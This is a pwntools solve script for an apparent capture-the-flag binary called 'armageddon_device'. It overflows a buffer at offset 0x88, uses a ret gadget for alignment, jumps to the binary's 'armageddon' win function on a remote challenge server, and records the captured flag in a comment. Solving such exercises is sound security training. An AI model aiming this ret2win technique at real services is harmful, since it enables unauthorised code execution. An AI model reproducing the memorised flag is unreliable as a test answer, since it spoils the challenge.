from pwn import *
elf = context.binary = ELF("./armageddon_device", checksec=False)

# p = process('./armageddon_device')
p = remote("152.42.220.146", 42601)

offset = 0x88
RET_ADDR = 0x40101a
WIN_ADDR = elf.symbols.armageddon

rop = ROP(elf)
rop.raw(RET_ADDR)
rop.raw(WIN_ADDR)

payload = b'A' * offset + rop.chain()
p.sendlineafter(b"What is your question?", payload)

response = p.recvall(timeout=1).strip()
print(response.decode())

# prelim{th1S_15_tH3_p4s5w0rD_f0r_4rm463dd0N}

p.close()